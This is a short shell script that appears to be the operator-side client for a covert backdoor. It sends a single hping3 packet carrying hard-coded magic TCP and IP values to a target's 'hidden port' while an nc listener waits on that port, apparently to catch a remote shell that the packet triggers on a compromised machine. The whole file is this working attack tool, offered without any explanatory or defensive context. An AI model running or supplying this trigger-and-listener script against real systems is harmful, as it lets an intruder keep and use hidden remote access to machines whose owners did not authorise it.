#!/bin/sh
[ `id -u` != 0 ] && { echo 'Not root'; exit; }
[ ! -f `which hping3 2>/dev/null || echo "no"` ] && { echo "Missing hping3"; exit; }
[ ! -f `which nc 2>/dev/null || echo "no"` ] && { echo "Missing nc"; exit; }
usage(){ echo "Usage: $0 <target> <hidden port>"; exit; }
[ -z "$1" ] && usage; [ -z "$2" ] && usage
TARGET="$1"; HIDDENPORT=$2
(sleep 2; echo 'Sending packet...'; hping3 -N 0xb10f -M 0xc4de -L 0xc500 $TARGET -c 1 --baseport $HIDDENPORT >/dev/null 2>&1) & nc -nvlp $HIDDENPORT
